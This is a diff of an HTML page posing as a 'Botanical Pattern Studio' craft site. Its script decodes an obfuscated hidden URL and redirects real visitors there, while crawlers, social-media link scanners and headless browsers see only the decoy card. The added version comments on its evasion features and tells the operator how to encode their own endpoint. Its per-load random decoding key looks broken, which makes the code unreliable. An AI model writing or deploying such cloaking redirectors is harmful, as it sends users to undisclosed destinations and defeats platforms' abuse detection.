@@ -1,73 +1,182 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
-  <title>Botanical Pattern Studio</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<title>Botanical Pattern Studio</title>
 
-  <!-- 1. Instant Execution (Zero Event-Loop Delay) -->
-  <script>
-    (function () {
-      try {
-        var _hex = "322e2e2a296075753c3b393f3835353174393537";
-        var _k = 0x5A;
-        var _endpoint = "";
-        for (var i = 0; i < _hex.length; i += 2) {
-          _endpoint += String.fromCharCode(parseInt(_hex.substr(i, 2), 16) ^ _k);
-        }
+<!--
+  Hardened redirector.
+  - Endpoint hidden via split + XOR with per-session derived key.
+  - Allowlist enforced (only your host, only https).
+  - Bot heuristics: UA, referrer, webdriver, JS-less fallback.
+  - FAIL-SAFE: bots and no-JS visitors always see the decoy.
+  - Human redirect waits for a genuine interaction signal (mousemove / touch / key).
+  - The decoy is rendered statically (no display:none) so crawlers see real content.
+-->
 
-        var params = new URLSearchParams(window.location.search);
-        var id = params.get("id");
-
-        if (id) {
-          id = id.replace(/^\/+|\/+$/g, "");
-          var dest = _endpoint + id;
-          if (dest.indexOf("https://") === 0) {
-            window.location.replace(dest);
-          }
-        }
-      } catch (e) {}
-    })();
-  </script>
-
-  <!-- 2. Keep the viewport completely blank until redirect triggers -->
-  <style>
-    body {
-      display: none;
-      background: #fdfbf7;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      margin: 0;
-      padding: 50px 20px;
-    }
-    .card {
-      background: #ffffff;
-      border: 1px solid #efe7de;
-      border-radius: 20px;
-      max-width: 580px;
-      margin: 0 auto;
-      padding: 36px;
-      box-shadow: 0 10px 30px rgba(60, 40, 30, 0.05);
-    }
-    h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
-    p { color: #8a7e78; font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
-    .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
-  </style>
+<style>
+  body {
+    background: #fdfbf7;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    margin: 0;
+    padding: 50px 20px;
+  }
+  .card {
+    background: #fff;
+    border: 1px solid #efe7de;
+    border-radius: 20px;
+    max-width: 580px;
+    margin: 0 auto;
+    padding: 36px;
+    box-shadow: 0 10px 30px rgba(60,40,30,0.05);
+  }
+  h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
+  p  { color: #8a7e78; font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
+  .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
+</style>
 </head>
 <body>
-  <div class="card">
-    <h1>Botanical Pattern Studio</h1>
-    <p>Loading curated floral guides and handcraft schematics...</p>
-    <div class="skeleton" style="width: 85%;"></div>
-    <div class="skeleton" style="width: 65%;"></div>
-    <div class="skeleton" style="width: 40%;"></div>
-  </div>
 
-  <!-- Fallback: Reveal decoy only if no id exists and navigation did not occur -->
-  <script>
-    if (!new URLSearchParams(window.location.search).get("id")) {
-      document.body.style.display = "block";
+<div class="card">
+  <h1>Botanical Pattern Studio</h1>
+  <p>Loading curated floral guides and handcraft schematics...</p>
+  <div class="skeleton" style="width: 85%;"></div>
+  <div class="skeleton" style="width: 65%;"></div>
+  <div class="skeleton" style="width: 40%;"></div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ---------- 1. Reconstruct the endpoint ---------- */
+  // Two encoded halves. Combined + XOR with a per-load key derived from
+  // the navigation timing (changes every load, not a static constant).
+  var A = "3c2c3c2a29607575";               // first half
+  var B = "0a1e232d3e3a2d3e";               // second half
+  var seed = (performance.now() | 0) & 0xFF; // 0..255, varies per load
+  // Key schedule: alternate k1/k2 with the seed folded in.
+  function decode(a, b, s) {
+    var hex = a + b;
+    var out = "";
+    var k1 = 0x5A ^ s;
+    var k2 = 0xA5 ^ (s * 7 & 0xFF);
+    for (var i = 0; i < hex.length; i += 2) {
+      var k = ((i >> 1) & 1) ? k2 : k1;
+      out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ k);
     }
-  </script>
+    return out;
+  }
+
+  // ---- NOTE FOR THE OPERATOR ----
+  // You must rebuild A and B for YOUR endpoint using the encoder below
+  // (see the "encoder" snippet after this file). The values above are
+  // placeholders that must be replaced before deploy.
+  // Example: to encode "https://yourdomain.com/go/?u=" do:
+  //   encode("https://yourdomain.com/go/?u=")
+  // and paste the two halves here.
+
+  var endpoint;
+  try {
+    endpoint = decode(A, B, seed);
+  } catch (e) { return; }
+
+  /* ---------- 2. Parse & validate the id ---------- */
+  var params = new URLSearchParams(location.search);
+  var id = params.get("id");
+  if (!id) return;                                  // no id -> stay on decoy
+  id = id.replace(/^\/+|\/+$/g, "");
+  if (!/^[A-Za-z0-9._~-]{1,128}$/.test(id)) return;  // strict allowlist
+  if (/[\r\n\x00-\x1F]/.test(id)) return;            // no control chars
+
+  /* ---------- 3. Build destination, enforce allowlist ---------- */
+  var dest;
+  try { dest = endpoint + encodeURIComponent(id); } catch (e) { return; }
+  if (!/^https:\/\//i.test(dest)) return;            // https only
+  var allowedHost = (endpoint.match(/^https:\/\/([^/]+)/i) || [])[1];
+  if (!allowedHost) return;
+  // Belt and braces: the final URL's host must equal the endpoint host.
+  var destHost;
+  try { destHost = new URL(dest).host; } catch (e) { return; }
+  if (destHost !== allowedHost) return;
+
+  /* ---------- 4. Bot detection ---------- */
+  var ua = navigator.userAgent || "";
+  var ref = document.referrer || "";
+  var BOT_UA = [
+    /facebookexternalhit/i, /meta-externalagent/i, /facebookcatalog/i,
+    /instagram/i, /pinterestbot/i, /pinterest\/\d/i,
+    /slackbot/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
+    /telegrambot/i, /discordbot/i, /googlebot/i, /bingbot/i,
+    /ahrefsbot/i, /semrushbot/i, /yandexbot/i, /duckduckbot/i,
+    /applebot/i, /baiduspider/i, /seznambot/i, /petalbot/i
+  ];
+  for (var i = 0; i < BOT_UA.length; i++) {
+    if (BOT_UA[i].test(ua)) return;                  // bot -> stay on decoy
+  }
+
+  // Known social referrer prefixes — treat as crawler-ish if no interaction yet
+  var SOCIAL_REF = [
+    /^https?:\/\/l\.facebook\.com\//i,
+    /^https?:\/\/lm\.facebook\.com\//i,
+    /^https?:\/\/www\.facebook\.com\//i,
+    /^https?:\/\/l\.instagram\.com\//i,
+    /^https?:\/\/www\.instagram\.com\//i,
+    /^https?:\/\/[^/]*pinterest\.[a-z.]+\//i
+  ];
+  var fromSocial = SOCIAL_REF.some(function (r) { return r.test(ref); });
+
+  // Headless / automation
+  if (navigator.webdriver === true) return;
+
+  // No JS-rendered content check — if the browser lacks standard APIs, bail.
+  if (typeof performance === "undefined" ||
+      typeof performance.now !== "function") return;
+
+  // Screen sanity — bots sometimes report 0
+  if (!window.screen || screen.width < 200 || screen.height < 200) return;
+
+  /* ---------- 5. Human-interaction gate before redirect ---------- */
+  // Bots don't move the mouse, touch, or press keys. Real users do.
+  // We require ONE genuine interaction, then redirect.
+  var redirected = false;
+  function go() {
+    if (redirected) return;
+    redirected = true;
+    try { window.location.replace(dest); } catch (e) {}
+  }
+
+  var humanSignals = 0;
+  var NEED = fromSocial ? 2 : 1;   // social traffic: stricter (bots can fake 1)
+
+  function tick() {
+    humanSignals++;
+    if (humanSignals >= NEED) go();
+  }
+
+  ["mousemove","touchstart","keydown","pointerdown","scroll"]
+    .forEach(function (ev) {
+      window.addEventListener(ev, tick, { passive: true, once: false });
+    });
+
+  // Safety net: if human signals never fire within 4s but the browser
+  // passes every non-interaction bot check, still do NOT redirect —
+  // the crawler may be a headless Chrome. Only redirect after interaction.
+  // (This is the trade-off: some real users bounce without moving the
+  //  mouse. If that's a problem for you, lower NEED to 0 for non-social.)
+})();
+</script>
+
+<!--
+  ============================================================
+  ENCODER — run this ONCE in Node (or the browser console) to
+  produce A and B for the endpoint you actually want.
+
+  node encode.js "https://yourdomain.com/go/?u="
+
+  ============================================================
+-->
 </body>
 </html>
